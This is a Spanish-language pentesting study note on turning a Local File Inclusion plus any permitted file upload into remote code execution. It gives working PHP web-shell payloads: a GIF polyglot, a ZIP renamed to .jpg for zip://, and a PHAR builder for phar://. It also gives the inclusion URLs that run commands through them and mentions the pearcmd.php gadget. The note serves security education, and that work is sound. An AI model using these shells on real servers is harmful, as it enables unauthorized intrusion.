---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - File-Inclusion
Fecha de actualización: 2026-06-22
Nota previa: "[[05 - Remote File Inclusion (RFI)]]"
Nota siguiente: "[[07 - Log Poisoning y envenenamiento de sesiones]]"
Area: "[[File Inclusion.base|File Inclusion]]"
---
---

Casi cualquier app moderna deja subir ficheros (avatar, adjuntos, documentos). Eso abre una vía de RCE para una LFI **sin necesitar `allow_url_include` ni acceso a logs**. La clave que lo hace tan potente: <mark style="background: #ADCCFFA6;">el formulario de subida **no tiene que ser vulnerable** — basta con que nos deje subir algún fichero</mark>. La vulnerabilidad real no está en el upload, sino en la inclusión.

# El requisito mínimo: subir un fichero, cualquiera

El módulo [[00 - Introducción a los File Upload Attacks|File Upload Attacks]] trata cómo colar ficheros saltándose filtros. Aquí no hace falta tanto: <mark style="background: #FF5582A6;">si la función de inclusión **ejecuta** código, el código dentro del fichero que subamos se ejecutará al incluirlo, sin importar su extensión ni su tipo</mark>. Una subida de imagen "perfectamente segura" se convierte en RCE en cuanto existe una LFI que apunte a ella. Sirve cualquier sink con capacidad de ejecución:

| Función | Lee | Ejecuta |
| - | :-: | :-: |
| **PHP** `include()` / `require()` (y `_once`) | ✅ | ✅ |
| **NodeJS** `res.render()` | ✅ | ✅ |
| **Java** `import` | ✅ | ✅ |
| **.NET** `include` | ✅ | ✅ |

# Método 1 — imagen con web shell (el fiable)

El más robusto y agnóstico de framework. Creamos una imagen que **sigue siendo una imagen válida** pero lleva código PHP dentro. Usamos una extensión permitida (`.gif`) y anteponemos la firma de GIF (`GIF89a`) por si el formulario valida cabecera y `Content-Type`:

```shell-session
$ echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
```

<mark style="background: #FFB8EBA6;">Se elige GIF porque sus magic bytes son ASCII</mark> y se teclean directos; otros formatos los tienen en binario y habría que URL-encodearlos. El ataque funciona con cualquier tipo permitido — la lógica de [[05 - Validación de tipo - Content-Type y magic bytes|magic bytes y Content-Type]] y de [[06 - Uploads limitados - SVG, polyglots y metadatos|polyglots]] del módulo File Upload aplica igual; esta imagen es, de hecho, el polyglot más simple.

Subimos el fichero (p. ej. como avatar) y necesitamos su **ruta**. Casi siempre la imagen es accesible y la ruta sale del código fuente de la página:

```html
<img src="/profile_images/shell.gif" class="profile-image">
```

Con la ruta, la incluimos y ejecutamos comando con `&cmd=`:

```
/index.php?language=./profile_images/shell.gif&cmd=id
```

Si la app **antepone un directorio** a nuestra entrada, salimos con `../` y luego damos la ruta del upload, como en cualquier [[01 - Local File Inclusion (LFI)|LFI con prefijo]]. Si no sabemos dónde aterriza el fichero, se fuzzea el directorio de subidas y el nombre (ver [[08 - Detección y fuzzing automatizado|fuzzing]]) — aunque algunas apps ocultan bien la ruta.

# Método 2 (solo PHP) — wrapper `zip://`

Alternativa cuando el método 1 no encaja. El wrapper [`zip://`](https://www.php.net/manual/en/wrappers.compression.php) **no está activo por defecto**, así que no siempre funciona. Empaquetamos el shell en un ZIP renombrado a `.jpg`:

```shell-session
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Tras subirlo, lo incluimos con `zip://` y referimos el fichero interno con `#shell.php` (URL-encodeado como `%23`):

```
/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

> [!warning]+ El Content-Type puede delatarlo
> Aunque lo llamemos `.jpg`, algunos formularios detectan el archivo como ZIP por su contenido y lo rechazan. Este método tiene más probabilidad de éxito si la subida de ZIP está permitida de por sí.

# Método 3 (solo PHP) — wrapper `phar://`

El wrapper `phar://` logra lo mismo por otra vía. Primero un script que compila un PHAR cuyo sub-fichero `shell.txt` contiene el web shell:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

Lo compilamos y lo renombramos a imagen:

```shell-session
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Tras subir `shell.jpg`, lo incluimos con `phar://` apuntando al sub-fichero `/shell.txt` (la `/` va como `%2F`):

```
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

> [!info]+ `phar://` es además un vector de deserialización
> Al acceder a un `.phar`, PHP **deserializa** sus metadatos automáticamente. Si la app llama a una función de sistema de ficheros (`file_exists`, `fopen`, `include`…) sobre una ruta `phar://` que controlamos, se dispara un ataque de deserialización aunque no haya `unserialize()` explícito. Se trata en [[Deserialización PHP|deserialización PHP]].

<mark style="background: #8000E1A6;">El método 1 es la primera opción</mark>: es el más fiable y vale para cualquier framework con inclusión ejecutable. `zip://` y `phar://` son específicos de PHP y dependen de wrappers que pueden estar desactivados — resérvalos como plan B.

> [!info]+ Vía obsoleta: LFI2RCE vía `phpinfo()`
> Existe un ataque clásico que combina LFI + `file_uploads = On` + una página `phpinfo()` expuesta: se explota la ventana de tiempo en que PHP guarda el upload en `/tmp` antes de borrarlo (race condition). Requisitos muy específicos y PHP antiguo, así que es raro hoy. Detalle en [HackTricks — LFI2RCE via phpinfo](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html).

> [!tip]+ Sin subir nada: el gadget `pearcmd.php`
> Si el servidor tiene **PEAR** instalado (frecuente en las imágenes Docker oficiales de PHP y en hosting compartido) y `register_argc_argv = On`, el fichero preexistente `/usr/local/lib/php/pearcmd.php` es un gadget de LFI→RCE: al incluirlo, los `+` de la query string se pasan como `argv` a PEAR, que puede **escribir un `.php` arbitrario** en una ruta conocida (p. ej. `/tmp/`) que luego incluimos. No requiere upload, `allow_url_include` ni logs —solo PEAR + `register_argc_argv`—. Payload exacto en [HackTricks — LFI2RCE via PEAR](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi2rce-via-pearcmd-php).

# Gotchas de producción

- <mark style="background: #FFB86CA6;">**Almacenamiento en cloud (S3, presigned URLs)**: si el fichero no acaba en el sistema de ficheros del servidor sino en un bucket, no hay ruta local que incluir y el método falla</mark>. Cada vez más común — confírmalo antes de descartar la LFI.
- **Nombre aleatorizado**: muchas apps renombran el upload (UUID/hash). Hay que leer la respuesta o la BD para conocer el nombre guardado.
- **Fuera del webroot**: si los uploads se guardan fuera de la raíz web, necesitas la ruta absoluta — léela de la config o de un mensaje de error (ver [[08 - Detección y fuzzing automatizado|webroot fuzzing]]).
- **Takeaway para bug bounty**: no descartes un upload que "solo acepta imágenes" si hay una LFI en el mismo objetivo. La combinación benigna+LFI es RCE.

> [!info]+ Fuentes
> - Módulo [[00 - Introducción a los File Upload Attacks|File Upload Attacks]] (magic bytes, polyglots, Content-Type) · [PHP — zip / phar wrappers](https://www.php.net/manual/en/wrappers.compression.php)
> - [HackTricks — LFI2RCE via file upload](https://book.hacktricks.xyz/pentesting-web/file-inclusion) · [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

Cuando no podemos subir un fichero pero la app **escribe lo que decimos en un log** (o en su sesión), ese fichero escribible se convierte en el vehículo del código: [[07 - Log Poisoning y envenenamiento de sesiones]].
